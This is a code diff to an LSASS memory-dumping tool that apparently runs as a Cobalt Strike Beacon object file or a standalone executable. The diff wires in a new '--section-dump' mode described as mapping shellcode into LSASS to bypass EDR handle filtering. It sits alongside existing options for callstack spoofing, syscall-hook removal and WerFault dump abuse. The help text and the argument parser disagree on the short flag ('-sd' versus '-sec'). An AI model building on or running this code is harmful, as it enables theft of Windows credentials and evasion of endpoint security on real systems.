@@ -2,8 +2,10 @@
 
 #ifdef BOF
  #include "nanodump.c"
+ #include "section_dump.c"
 #else
  #include "nanodump.h"
+ #include "section_dump.h"
 #endif
 
 #if defined(NANO) && defined(BOF)
@@ -35,6 +37,7 @@ void go(char* args, int length)
     LPCSTR         silent_process_exit;
     BOOL           use_lsass_shtinkering;
     BOOL           spoof_callstack;
+    BOOL           use_section_dump;
     PPROCESS_LIST  created_processes = NULL;
     HANDLE         hSnapshot = NULL;
     WCHAR          wcFilePath[MAX_PATH];
@@ -71,6 +74,7 @@ void go(char* args, int length)
     use_silent_process_exit = (BOOL)BeaconDataInt(&parser);
     silent_process_exit = BeaconDataExtract(&parser, NULL);
     use_lsass_shtinkering = (BOOL)BeaconDataInt(&parser);
+    use_section_dump = (BOOL)BeaconDataInt(&parser);
 
     remove_syscall_callback_hook();
 
@@ -106,6 +110,19 @@ void go(char* args, int length)
         // let the Windows Error Reporting process make the dump for us
         werfault_silent_process_exit(lsass_pid, silent_process_exit);
         return;
+    }
+
+    if (use_section_dump)
+    {
+        success = section_dump(
+            lsass_pid,
+            write_dump_to_disk,
+            dump_path,
+            use_valid_sig,
+            chunk_size);
+        if (success)
+            ret_val = TRUE;
+        goto cleanup;
     }
 
     if (write_dump_to_disk)
@@ -266,7 +283,7 @@ cleanup:
 
 void usage(char* procname)
 {
-    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", procname);
+    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--section-dump] [--fork] [--snapshot] [--getpid] [--help]", procname);
     PRINT("Dumpfile options:");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
@@ -290,6 +307,9 @@ void usage(char* procname)
     PRINT("            force WerFault.exe to dump " LSASS " via SilentProcessExit");
     PRINT("    --shtinkering, -sk");
     PRINT("            force WerFault.exe to dump " LSASS " via Shtinkering");
+    PRINT("Bypass EDR handle filtering:");
+    PRINT("    --section-dump, -sd");
+    PRINT("            map shellcode into " LSASS " via NtMapViewOfSection (no VM_READ needed)");
     PRINT("Avoid reading " LSASS " directly:");
     PRINT("    --fork, -f");
     PRINT("            fork the target process before dumping");
@@ -328,6 +348,7 @@ int main(int argc, char* argv[])
     BOOL           use_seclogon_duplicate         = FALSE;
     BOOL           use_lsass_shtinkering          = FALSE;
     BOOL           spoof_callstack                = FALSE;
+    BOOL           use_section_dump               = FALSE;
     HANDLE         hSnapshot                      = NULL;
     PPROCESS_LIST  created_processes              = NULL;
     BOOL           ret_val                        = FALSE;
@@ -488,6 +509,11 @@ int main(int argc, char* argv[])
                  !strncmp(argv[i], "--seclogon-duplicate", 21))
         {
             use_seclogon_duplicate = TRUE;
+        }
+        else if (!strncmp(argv[i], "-sec", 5) ||
+                 !strncmp(argv[i], "--section-dump", 15))
+        {
+            use_section_dump = TRUE;
         }
         else if (!strncmp(argv[i], "-sync", 6))
         {
@@ -750,6 +776,17 @@ int main(int argc, char* argv[])
     {
         // let the Windows Error Reporting process make the dump for us
         ret_val = werfault_silent_process_exit(lsass_pid, silent_process_exit);
+        goto cleanup;
+    }
+
+    if (use_section_dump)
+    {
+        ret_val = section_dump(
+            lsass_pid,
+            TRUE, /* always write to disk in EXE mode */
+            dump_path,
+            use_valid_sig,
+            0);
         goto cleanup;
     }
 
